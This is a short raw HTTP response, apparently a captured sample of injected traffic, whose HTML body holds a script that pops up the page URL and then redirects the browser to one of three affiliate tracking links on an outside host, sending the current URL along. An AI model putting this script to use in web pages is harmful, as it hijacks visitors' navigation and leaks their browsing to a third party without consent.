HTTP/1.1 200 OK
Server: GFW/5.1.8 (Kylin)
Content-Type: text/html
Set-Cookie: lf_spof=12lfspof
Connection: keep-alive

<html>
<script>
/**/
var urls=[
  'http://p.zhitui.com/?aid=119&sid=101776&url=',
  'http://p.zhitui.com/?aid=119&sid=101777&url=',
  'http://p.zhitui.com/?aid=119&sid=101778&url=',
];
alert(document.location.href);
document.location.href=urls[parseInt(Math.random()*urls.length,10)]+encodeURIComponent(document.location.href);
</script></html>
